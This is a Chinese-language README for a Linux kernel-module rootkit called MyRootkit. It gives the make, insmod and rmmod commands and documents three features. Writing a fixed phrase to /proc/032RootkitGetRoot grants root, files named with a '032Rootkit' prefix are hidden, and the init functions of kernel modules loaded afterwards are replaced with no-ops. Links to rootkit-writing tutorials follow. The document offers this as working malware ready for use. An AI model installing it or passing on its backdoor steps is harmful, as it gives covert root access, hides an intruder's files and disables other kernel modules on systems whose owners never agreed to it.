# MyRootkit

一个简单的Linux LKM Rootkit。


## 编译安装

编译

```
make
```

安装

```
sudo insmod lkm.ko
```

卸载

```
sudo rmmod lkm
```

## 用法说明

### 获取root权限

执行

```
echo "Please help me, rootkit." > /proc/032RootkitGetRoot
```

即可获得root权限

### 隐藏文件

隐藏以“032Rootkit”开头的所有文件。

### 控制内核模块的加载

安装lkm.ko后将自动把之后安装的内核模块的初始函数掉包成一个什么也不做的函数。


## 参考资料

[Linux Rootkit 系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)
[Linux Rootkit 系列二：基于修改 sys_call_table 的系统调用挂钩](http://www.freebuf.com/sectool/105713.html)
[Linux Rootkit 系列三：实例详解 Rootkit 必备的基本功能 ](http://www.freebuf.com/articles/system/107829.html)
[看我如何通过Linux Rootkit实现文件隐藏](http://www.360zhijia.com/360anquanke/326017.html)
